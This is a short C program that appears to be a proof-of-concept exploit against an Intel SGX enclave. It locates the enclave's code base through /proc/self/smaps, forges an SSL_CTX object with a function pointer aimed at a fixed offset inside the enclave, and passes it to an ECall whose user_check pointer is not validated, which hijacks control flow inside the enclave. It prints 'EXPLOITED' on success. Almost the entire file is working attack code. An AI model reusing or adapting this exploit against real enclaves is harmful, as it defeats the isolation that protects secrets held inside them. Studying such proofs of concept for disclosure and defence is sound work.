#include <stdio.h>
#include <stdlib.h>

#include <string.h>

#include "sgx_edger8r.h" // sgx_ecall
#include "sgx_urts.h" // sgx_create_enclave

/* Global EID shared by multiple threads */
sgx_enclave_id_t global_eid = 0;

int initialize_enclave(const char* enclave_filename)
{
    if (global_eid != 0)
        return 0;

    sgx_launch_token_t token = {0};
    int updated;
    sgx_status_t ret = sgx_create_enclave(enclave_filename, SGX_DEBUG_FLAG, &token, &updated, &global_eid, NULL);
    if (ret != SGX_SUCCESS)
        return -1;

    return 0;
}

void* enclave_base() {
        FILE* fp = fopen("/proc/self/smaps", "r");
        if (fp == 0) return 0;
        char* line = 0; size_t len = 0; ssize_t read;

        // first isgx page (CODE, r_x)
        while((read = getline(&line, &len, fp)) != -1)
                if (strstr(line, "isgx"))
                        return (void*)strtoll(line, NULL, 16);
}

int call_ecall(int ecall_idx, void* ms)
{
    sgx_ecall(global_eid, ecall_idx, 0, ms);
}

int main(int argc, char** argv)
{
    if (initialize_enclave("enclave.signed.so") < 0)
        return -1;

	uint64_t* base = (uint64_t*) enclave_base();

	// 1. Create a fake SSL_CTX
    uint64_t buffer[1000] = { 0 };
    buffer[0] = (uint64_t) buffer;
    buffer[0x88/8] = 0xDEADC0DE;
    buffer[0x88/8] = (uint64_t) base + 0x363f5;

	// 2. The ECall will call the function specified in the fake objecct.
    uint64_t ms[] = { 0, (uint64_t) buffer, 0, (uint64_t) buffer, sizeof(buffer), 1 };
    // public long ecall_SSL_CTX_ctrl([user_check] SSL_CTX *ctx, int cmd, long larg, [user_check] void *parg);
    call_ecall(11, ms);

	if ((int) ms[0] == 2)
        printf("EXPLOITED\n");
}
